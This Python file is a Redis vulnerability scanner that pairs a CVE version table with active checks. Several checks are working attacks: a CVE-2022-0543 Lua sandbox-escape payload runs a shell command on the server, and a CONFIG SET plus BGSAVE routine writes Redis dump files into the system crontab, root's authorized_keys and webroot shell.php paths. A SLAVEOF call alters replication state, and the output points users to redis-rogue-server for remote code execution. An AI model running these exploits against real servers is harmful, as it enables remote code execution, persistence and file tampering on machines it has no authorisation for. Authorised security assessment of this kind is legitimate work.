import socket
from typing import Dict, Any, List, Optional
from packaging.version import Version

from rich.console import Console
from rich.table import Table

console = Console()

REDIS_CVES = [
    {
        "id": "CVE-2022-0543",
        "title": "Lua Sandbox Escape (Debian/Ubuntu)",
        "severity": "critical",
        "cvss": 10.0,
        "affected": None,
        "description": "Debian/Ubuntu-specific Lua sandbox escape via package.loadlib. Allows RCE.",
        "active_check": True,
    },
    {
        "id": "CVE-2024-31449",
        "title": "Lua Sandbox Escape via Eval Scripts",
        "severity": "critical",
        "cvss": 8.8,
        "affected": [
            ((Version("0"), Version("7.2.6")),),
            ((Version("7.3.0"), Version("7.4.1")),),
        ],
        "description": "Authenticated users can trigger RCE via specially crafted Lua scripts.",
    },
    {
        "id": "CVE-2024-31228",
        "title": "Unbounded Pattern Matching DoS",
        "severity": "high",
        "cvss": 7.5,
        "affected": [
            ((Version("0"), Version("7.2.6")),),
            ((Version("7.3.0"), Version("7.4.1")),),
        ],
        "description": "Authenticated users can trigger DoS via specially crafted patterns.",
    },
    {
        "id": "CVE-2023-45145",
        "title": "Unix Socket Race Condition",
        "severity": "medium",
        "cvss": 3.6,
        "affected": [
            ((Version("0"), Version("7.0.14")),),
            ((Version("7.1.0"), Version("7.2.4")),),
        ],
        "description": "Race condition during Unix socket listen may allow unauthorized access.",
    },
    {
        "id": "CVE-2023-36824",
        "title": "Heap Overflow COMMAND GETKEYS/DOCS",
        "severity": "high",
        "cvss": 8.8,
        "affected": [((Version("7.0.0"), Version("7.0.12")),)],
        "description": "Heap overflow extracting keys from commands in COMMAND GETKEYS/DOCS.",
    },
    {
        "id": "CVE-2023-28856",
        "title": "HINCRBYFLOAT Crash",
        "severity": "medium",
        "cvss": 6.5,
        "affected": [
            ((Version("0"), Version("6.0.19")),),
            ((Version("6.1.0"), Version("6.2.12")),),
            ((Version("7.0.0"), Version("7.0.11")),),
        ],
        "description": "Authenticated users can crash server with HINCRBYFLOAT on invalid hash field.",
    },
    {
        "id": "CVE-2023-25155",
        "title": "Integer Overflow SRANDMEMBER/ZRANGESTORE/LMPOP",
        "severity": "high",
        "cvss": 8.2,
        "affected": [
            ((Version("0"), Version("6.0.18")),),
            ((Version("6.1.0"), Version("6.2.11")),),
            ((Version("7.0.0"), Version("7.0.9")),),
        ],
        "description": "Integer overflow in SRANDMEMBER, ZRANGESTORE, LMPOP leads to heap overflow.",
    },
    {
        "id": "CVE-2023-22458",
        "title": "Integer Overflow HRANDFIELD/ZRANDMEMBER",
        "severity": "high",
        "cvss": 8.2,
        "affected": [((Version("7.0.0"), Version("7.0.8")),)],
        "description": "Integer overflow in HRANDFIELD and ZRANDMEMBER with negative count.",
    },
    {
        "id": "CVE-2022-24735",
        "title": "Lua Sandbox Escape via Crafted Scripts",
        "severity": "high",
        "cvss": 7.0,
        "affected": [
            ((Version("0"), Version("6.2.7")),),
            ((Version("7.0.0"), Version("7.0.0")),),
        ],
        "description": "Lua sandbox bypass via crafted Lua scripts loaded into Redis.",
    },
    {
        "id": "CVE-2022-24736",
        "title": "Use-After-Free via Lua Scripts",
        "severity": "medium",
        "cvss": 5.0,
        "affected": [
            ((Version("0"), Version("6.2.7")),),
            ((Version("7.0.0"), Version("7.0.0")),),
        ],
        "description": "Crafted Lua scripts can trigger use-after-free, causing crash.",
    },
    {
        "id": "CVE-2021-32762",
        "title": "Integer Overflow in redis-cli/redis-sentinel",
        "severity": "high",
        "cvss": 8.8,
        "affected": [
            ((Version("2.6.0"), Version("6.2.6")),),
            ((Version("7.0.0"), Version("7.0.0")),),
        ],
        "description": "Integer overflow in redis-cli and redis-sentinel parsing large replies.",
    },
    {
        "id": "CVE-2021-32761",
        "title": "BITFIELD Integer Overflow",
        "severity": "high",
        "cvss": 7.5,
        "affected": [
            ((Version("2.6.0"), Version("5.0.13")),),
            ((Version("6.0.0"), Version("6.0.15")),),
            ((Version("6.2.0"), Version("6.2.5")),),
        ],
        "description": "Integer overflow on 32-bit systems handling BITFIELD command.",
    },
    {
        "id": "CVE-2021-32687",
        "title": "Intset Integer Overflow",
        "severity": "high",
        "cvss": 7.5,
        "affected": [
            ((Version("2.6.0"), Version("5.0.13")),),
            ((Version("6.0.0"), Version("6.0.15")),),
            ((Version("6.2.0"), Version("6.2.5")),),
        ],
        "description": "Integer overflow in intset implementation on 32-bit systems.",
    },
    {
        "id": "CVE-2021-32675",
        "title": "DoS via RESP Request",
        "severity": "high",
        "cvss": 7.5,
        "affected": [
            ((Version("2.6.0"), Version("5.0.13")),),
            ((Version("6.0.0"), Version("6.0.15")),),
            ((Version("6.2.0"), Version("6.2.5")),),
        ],
        "description": "Specially crafted multi-bulk RESP request causes DoS.",
    },
    {
        "id": "CVE-2021-32672",
        "title": "Lua Debugger Random Heap Read",
        "severity": "medium",
        "cvss": 5.3,
        "affected": [
            ((Version("0"), Version("5.0.13")),),
            ((Version("6.0.0"), Version("6.0.15")),),
            ((Version("6.2.0"), Version("6.2.5")),),
        ],
        "description": "Lua debugging functions can read random heap memory.",
    },
    {
        "id": "CVE-2021-32626",
        "title": "Lua Sandbox Escape via Crafted Lua Scripts",
        "severity": "high",
        "cvss": 8.8,
        "affected": [
            ((Version("0"), Version("5.0.13")),),
            ((Version("6.0.0"), Version("6.0.15")),),
            ((Version("6.2.0"), Version("6.2.5")),),
        ],
        "description": "Specially crafted Lua scripts escape the sandbox and execute arbitrary code.",
    },
    {
        "id": "CVE-2021-32625",
        "title": "Integer Overflow in STRALGO LCS",
        "severity": "high",
        "cvss": 8.8,
        "affected": [((Version("6.0.0"), Version("6.0.12")),)],
        "description": "Integer overflow on 32-bit systems in STRALGO LCS command.",
    },
]

LUA_LIBRARY_PATHS = [
    "/usr/lib/x86_64-linux-gnu/liblua5.1.so.0",
    "/usr/lib/x86_64-linux-gnu/liblua5.1.so",
    "/usr/lib/x86_64-linux-gnu/liblua5.2.so.0",
    "/usr/lib/aarch64-linux-gnu/liblua5.1.so.0",
    "/usr/lib/i386-linux-gnu/liblua5.1.so.0",
    "/usr/lib64/liblua-5.1.so",
    "/usr/lib64/liblua5.1.so",
    "/usr/lib64/liblua5.1.so.0",
    "/usr/lib/liblua5.1.so.0",
    "/usr/lib/liblua5.1.so",
]

WRITABLE_DIRS = {
    "cron_etc": {"dir": "/etc", "dbfilename": "crontab", "desc": "System crontab"},
    "cron_spool": {"dir": "/var/spool/cron", "dbfilename": "root", "desc": "User crontab (CentOS)"},
    "cron_crontabs": {"dir": "/var/spool/cron/crontabs", "dbfilename": "root", "desc": "User crontab (Debian)"},
    "ssh_root": {"dir": "/root/.ssh", "dbfilename": "authorized_keys", "desc": "Root SSH keys"},
    "webroot_nginx": {"dir": "/usr/share/nginx/html", "dbfilename": "shell.php", "desc": "Nginx webroot"},
    "webroot_apache": {"dir": "/var/www/html", "dbfilename": "shell.php", "desc": "Apache webroot"},
    "tmp": {"dir": "/tmp", "dbfilename": "redis_test", "desc": "/tmp directory"},
}


def _send_raw(host: str, port: int, data: str, timeout: int = 5) -> str:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(data.encode())
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"\r\n" in chunk:
                    break
            except socket.timeout:
                break
        sock.close()
        return response.decode(errors="replace")
    except Exception as e:
        return f"ERROR: {e}"


def _redis_cmd(host: str, port: int, *args, password: Optional[str] = None, timeout: int = 5) -> str:
    try:
        import redis as redis_lib
        r = redis_lib.Redis(host=host, port=port, password=password, socket_timeout=timeout, decode_responses=True)
        result = r.execute_command(*args)
        r.close()
        if isinstance(result, bytes):
            return result.decode(errors="replace")
        return str(result)
    except Exception as e:
        return f"ERROR: {e}"


def _version_affected(version: Version, ranges) -> bool:
    if ranges is None:
        return True
    for range_set in ranges:
        for low, high in range_set:
            if low <= version < high:
                return True
    return False


class RedisCVEScanner:
    def __init__(self, host: str, port: int = 6379, password: Optional[str] = None, timeout: int = 5):
        self.host = host
        self.port = port
        self.password = password
        self.timeout = timeout
        self.version_str = "unknown"
        self.version = None
        self.os_info = ""
        self.server_info = {}
        self.results: List[Dict[str, Any]] = []

    def connect_and_info(self) -> bool:
        try:
            import redis as redis_lib
            r = redis_lib.Redis(
                host=self.host, port=self.port, password=self.password,
                socket_timeout=self.timeout, decode_responses=True
            )
            info = r.info("server")
            self.version_str = info.get("redis_version", "unknown")
            self.os_info = info.get("os", "unknown")
            self.server_info = info
            try:
                self.version = Version(self.version_str)
            except Exception:
                self.version = None
            r.close()
            return True
        except Exception as e:
            console.print(f"[red][-] Cannot connect to Redis: {e}[/red]")
            return False

    def check_version_cves(self):
        if not self.version:
            return
        for cve in REDIS_CVES:
            if cve.get("active_check"):
                continue
            if _version_affected(self.version, cve["affected"]):
                self.results.append({
                    "cve_id": cve["id"],
                    "title": cve["title"],
                    "severity": cve["severity"],
                    "cvss": cve["cvss"],
                    "status": "potentially_vulnerable",
                    "description": cve["description"],
                    "details": f"Redis {self.version_str} falls within affected version range",
                })

    def check_cve_2022_0543(self) -> Optional[Dict[str, Any]]:
        try:
            import redis as redis_lib
            r = redis_lib.Redis(
                host=self.host, port=self.port, password=self.password,
                socket_timeout=self.timeout, decode_responses=True
            )
            for lib_path in LUA_LIBRARY_PATHS:
                lua = (
                    f'local io_l = package.loadlib("{lib_path}", "luaopen_io"); '
                    f'local io = io_l(); '
                    f'local f = io.popen("id", "r"); '
                    f'local res = f:read("*a"); f:close(); return res'
                )
                try:
                    result = r.eval(lua, 0)
                    if result and "uid=" in str(result):
                        entry = {
                            "cve_id": "CVE-2022-0543",
                            "title": "Lua Sandbox Escape - RCE CONFIRMED",
                            "severity": "critical",
                            "cvss": 10.0,
                            "status": "exploitable",
                            "description": "Remote code execution via Lua sandbox escape.",
                            "details": f"Library: {lib_path} | Output: {str(result).strip()}",
                            "exploit_lib": lib_path,
                        }
                        self.results.append(entry)
                        r.close()
                        return entry
                except Exception as e:
                    err = str(e)
                    if "nonexistent global variable" in err.lower() or "unexisting global" in err.lower():
                        break
                    if "no such file" in err.lower() or "cannot open" in err.lower():
                        continue
            r.close()
        except Exception:
            pass
        self.results.append({
            "cve_id": "CVE-2022-0543",
            "title": "Lua Sandbox Escape (Debian/Ubuntu)",
            "severity": "critical",
            "cvss": 10.0,
            "status": "not_exploitable",
            "description": "Lua sandbox escape not available (non-Debian or patched).",
            "details": f"Tested {len(LUA_LIBRARY_PATHS)} library paths, none worked.",
        })
        return None

    def check_unauth(self) -> Dict[str, Any]:
        try:
            import redis as redis_lib
            r = redis_lib.Redis(host=self.host, port=self.port, socket_timeout=self.timeout, decode_responses=True)
            r.ping()
            r.close()
            entry = {
                "cve_id": "MISC-001",
                "title": "Unauthenticated Access",
                "severity": "critical",
                "cvss": 9.8,
                "status": "exploitable",
                "description": "Redis accepts connections without any authentication.",
                "details": "No password required. Full read/write access to all data.",
            }
            self.results.append(entry)
            return entry
        except Exception:
            entry = {
                "cve_id": "MISC-001",
                "title": "Unauthenticated Access",
                "severity": "info",
                "cvss": 0,
                "status": "not_vulnerable",
                "description": "Redis requires authentication.",
                "details": "Password is configured.",
            }
            self.results.append(entry)
            return entry

    def check_config_write(self) -> Dict[str, Any]:
        try:
            import redis as redis_lib
            r = redis_lib.Redis(
                host=self.host, port=self.port, password=self.password,
                socket_timeout=self.timeout, decode_responses=True
            )
            old_dir = r.config_get("dir").get("dir", "")
            old_dbfn = r.config_get("dbfilename").get("dbfilename", "")

            writable = []
            bgsave_writable = []

            for name, info in WRITABLE_DIRS.items():
                try:
                    r.config_set("dir", info["dir"])
                    writable.append(f"{info['dir']} ({info['desc']})")
                    try:
                        r.config_set("dbfilename", info["dbfilename"])
                        r.bgsave()
                        import time
                        time.sleep(1)
                        last_status = r.info("persistence").get("rdb_last_bgsave_status", "err")
                        if last_status == "ok":
                            bgsave_writable.append(f"{info['dir']}/{info['dbfilename']} ({info['desc']})")
                    except Exception:
                        pass
                except Exception:
                    continue

            try:
                r.config_set("dir", old_dir)
                r.config_set("dbfilename", old_dbfn)
            except Exception:
                pass
            r.close()

            if bgsave_writable:
                entry = {
                    "cve_id": "MISC-002",
                    "title": "Arbitrary File Write via CONFIG SET + BGSAVE",
                    "severity": "critical",
                    "cvss": 9.8,
                    "status": "exploitable",
                    "description": "Redis can write files to sensitive directories (RCE possible).",
                    "details": f"CONFIG SET dirs: {', '.join(writable)}\nBGSAVE confirmed: {', '.join(bgsave_writable)}",
                    "writable_dirs": writable,
                    "bgsave_writable": bgsave_writable,
                }
            elif writable:
                entry = {
                    "cve_id": "MISC-002",
                    "title": "CONFIG SET dir Allowed (BGSAVE restricted)",
                    "severity": "high",
                    "cvss": 7.5,
                    "status": "potentially_vulnerable",
                    "description": "CONFIG SET dir succeeds but BGSAVE fails (file write restricted).",
                    "details": f"CONFIG SET dirs: {', '.join(writable)} | BGSAVE failed for all.",
                    "writable_dirs": writable,
                    "bgsave_writable": [],
                }
            else:
                entry = {
                    "cve_id": "MISC-002",
                    "title": "CONFIG SET dir Restricted",
                    "severity": "info",
                    "cvss": 0,
                    "status": "not_vulnerable",
                    "description": "Cannot change Redis working directory.",
                    "details": "CONFIG SET dir is blocked or no writable paths found.",
                }
            self.results.append(entry)
            return entry
        except Exception as e:
            entry = {
                "cve_id": "MISC-002",
                "title": "CONFIG SET Check Failed",
                "severity": "info",
                "cvss": 0,
                "status": "error",
                "description": f"Error checking CONFIG SET: {e}",
            }
            self.results.append(entry)
            return entry

    def check_module_load(self) -> Dict[str, Any]:
        try:
            import redis as redis_lib
            r = redis_lib.Redis(
                host=self.host, port=self.port, password=self.password,
                socket_timeout=self.timeout, decode_responses=True
            )
            modules = r.execute_command("MODULE", "LIST")
            entry = {
                "cve_id": "MISC-003",
                "title": "MODULE LOAD Available (Rogue Server RCE)",
                "severity": "critical",
                "cvss": 9.8,
                "status": "exploitable",
                "description": "MODULE command available. Malicious .so can be loaded for RCE.",
                "details": f"Loaded modules: {len(modules)}. Use redis-rogue-server for exploitation.",
            }
            self.results.append(entry)
            r.close()
            return entry
        except Exception as e:
            err = str(e).lower()
            status = "not_vulnerable" if "unknown command" in err else "error"
            entry = {
                "cve_id": "MISC-003",
                "title": "MODULE LOAD Not Available",
                "severity": "info",
                "cvss": 0,
                "status": status,
                "description": "MODULE command not available (Redis < 4.0 or disabled).",
            }
            self.results.append(entry)
            return entry

    def check_slaveof(self) -> Dict[str, Any]:
        try:
            import redis as redis_lib
            r = redis_lib.Redis(
                host=self.host, port=self.port, password=self.password,
                socket_timeout=self.timeout, decode_responses=True
            )
            info = r.info("replication")
            role = info.get("role", "unknown")
            connected_slaves = info.get("connected_slaves", 0)
            slaveof_available = True

            try:
                r.execute_command("SLAVEOF", "NO", "ONE")
            except Exception as e:
                if "unknown command" in str(e).lower() or "not allowed" in str(e).lower():
                    slaveof_available = False

            r.close()

            if slaveof_available and self.version and self.version >= Version("4.0.0"):
                entry = {
                    "cve_id": "MISC-004",
                    "title": "SLAVEOF + MODULE LOAD RCE (Master-Slave Replication)",
                    "severity": "critical",
                    "cvss": 9.8,
                    "status": "exploitable",
                    "description": "SLAVEOF available with MODULE LOAD. Rogue server attack possible.",
                    "details": f"Role: {role} | Slaves: {connected_slaves} | Use redis-rogue-server.",
                }
            elif slaveof_available:
                entry = {
                    "cve_id": "MISC-004",
                    "title": "SLAVEOF Available (No MODULE LOAD)",
                    "severity": "medium",
                    "cvss": 5.0,
                    "status": "potentially_vulnerable",
                    "description": "SLAVEOF available but MODULE LOAD not supported (Redis < 4.0).",
                    "details": f"Role: {role} | Version: {self.version_str}",
                }
            else:
                entry = {
                    "cve_id": "MISC-004",
                    "title": "SLAVEOF Restricted",
                    "severity": "info",
                    "cvss": 0,
                    "status": "not_vulnerable",
                    "description": "SLAVEOF command is not available or disabled.",
                }
            self.results.append(entry)
            return entry
        except Exception as e:
            entry = {
                "cve_id": "MISC-004",
                "title": "SLAVEOF Check Error",
                "severity": "info",
                "cvss": 0,
                "status": "error",
                "description": f"Error checking SLAVEOF: {e}",
            }
            self.results.append(entry)
            return entry

    def check_protected_mode(self) -> Dict[str, Any]:
        try:
            import redis as redis_lib
            r = redis_lib.Redis(
                host=self.host, port=self.port, password=self.password,
                socket_timeout=self.timeout, decode_responses=True
            )
            cfg = r.config_get("protected-mode")
            bind_cfg = r.config_get("bind")
            protected = cfg.get("protected-mode", "yes")
            bind_addr = bind_cfg.get("bind", "127.0.0.1")
            r.close()

            if bind_addr in ("0.0.0.0", "") and protected == "no":
                entry = {
                    "cve_id": "MISC-005",
                    "title": "Exposed Without Protected Mode",
                    "severity": "critical",
                    "cvss": 9.0,
                    "status": "exploitable",
                    "description": "Redis bound to 0.0.0.0 with protected-mode off. Fully exposed.",
                    "details": f"bind={bind_addr}, protected-mode={protected}",
                }
            elif bind_addr in ("0.0.0.0", ""):
                entry = {
                    "cve_id": "MISC-005",
                    "title": "Bound to All Interfaces",
                    "severity": "high",
                    "cvss": 7.5,
                    "status": "potentially_vulnerable",
                    "description": "Redis bound to 0.0.0.0, accessible from any network.",
                    "details": f"bind={bind_addr}, protected-mode={protected}",
                }
            else:
                entry = {
                    "cve_id": "MISC-005",
                    "title": "Network Binding",
                    "severity": "info",
                    "cvss": 0,
                    "status": "not_vulnerable",
                    "description": f"Redis bound to {bind_addr}.",
                }
            self.results.append(entry)
            return entry
        except Exception:
            return {}

    def scan(self) -> List[Dict[str, Any]]:
        console.print(f"\n[bold cyan]{'=' * 60}[/bold cyan]")
        console.print(f"[bold cyan]Redis CVE Scanner - {self.host}:{self.port}[/bold cyan]")
        console.print(f"[bold cyan]{'=' * 60}[/bold cyan]\n")

        if not self.connect_and_info():
            return self.results

        console.print(f"[green][+] Redis Version:[/green] {self.version_str}")
        console.print(f"[green][+] OS:[/green] {self.os_info}")
        console.print()

        console.print("[bold yellow][*] Checking version-based CVEs...[/bold yellow]")
        self.check_version_cves()

        console.print("[bold yellow][*] Testing CVE-2022-0543 (Lua sandbox escape)...[/bold yellow]")
        self.check_cve_2022_0543()

        console.print("[bold yellow][*] Checking unauthenticated access...[/bold yellow]")
        self.check_unauth()

        console.print("[bold yellow][*] Checking CONFIG SET file write...[/bold yellow]")
        self.check_config_write()

        console.print("[bold yellow][*] Checking MODULE LOAD...[/bold yellow]")
        self.check_module_load()

        console.print("[bold yellow][*] Checking SLAVEOF/replication RCE...[/bold yellow]")
        self.check_slaveof()

        console.print("[bold yellow][*] Checking network exposure...[/bold yellow]")
        self.check_protected_mode()

        self._print_results()
        return self.results

    def _print_results(self):
        console.print(f"\n[bold cyan]{'=' * 60}[/bold cyan]")
        console.print("[bold cyan]CVE Scan Results[/bold cyan]")
        console.print(f"[bold cyan]{'=' * 60}[/bold cyan]\n")

        severity_colors = {
            "critical": "red bold",
            "high": "red",
            "medium": "yellow",
            "low": "blue",
            "info": "dim",
        }

        exploitable = [r for r in self.results if r.get("status") == "exploitable"]
        potential = [r for r in self.results if r.get("status") == "potentially_vulnerable"]

        table = Table(title=f"Redis {self.version_str} @ {self.host}:{self.port}")
        table.add_column("CVE / ID", style="cyan", width=18)
        table.add_column("Title", width=40)
        table.add_column("Severity", width=10)
        table.add_column("CVSS", width=6)
        table.add_column("Status", width=22)

        status_styles = {
            "exploitable": "[red bold]EXPLOITABLE[/red bold]",
            "potentially_vulnerable": "[yellow]POTENTIALLY VULN[/yellow]",
            "not_vulnerable": "[green]NOT VULNERABLE[/green]",
            "not_exploitable": "[green]NOT EXPLOITABLE[/green]",
            "error": "[dim]ERROR[/dim]",
        }

        sorted_results = sorted(self.results, key=lambda x: (
            {"exploitable": 0, "potentially_vulnerable": 1}.get(x.get("status", ""), 2),
            -x.get("cvss", 0)
        ))

        for r in sorted_results:
            sev = r.get("severity", "info")
            style = severity_colors.get(sev, "dim")
            status_display = status_styles.get(r.get("status", ""), r.get("status", ""))
            table.add_row(
                r.get("cve_id", ""),
                r.get("title", ""),
                f"[{style}]{sev.upper()}[/{style}]",
                str(r.get("cvss", "")),
                status_display,
            )

        console.print(table)

        if exploitable:
            console.print(f"\n[red bold][!] {len(exploitable)} EXPLOITABLE vulnerabilities found![/red bold]")
            for r in exploitable:
                console.print(f"  [red]> {r['cve_id']}: {r['title']}[/red]")
                if r.get("details"):
                    console.print(f"    [dim]{r['details']}[/dim]")

        if potential:
            console.print(f"\n[yellow][!] {len(potential)} potentially vulnerable (version-based)[/yellow]")

        console.print()


def scan_redis_cves(host: str, port: int = 6379, password: Optional[str] = None, timeout: int = 5) -> List[Dict[str, Any]]:
    scanner = RedisCVEScanner(host, port, password, timeout)
    return scanner.scan()
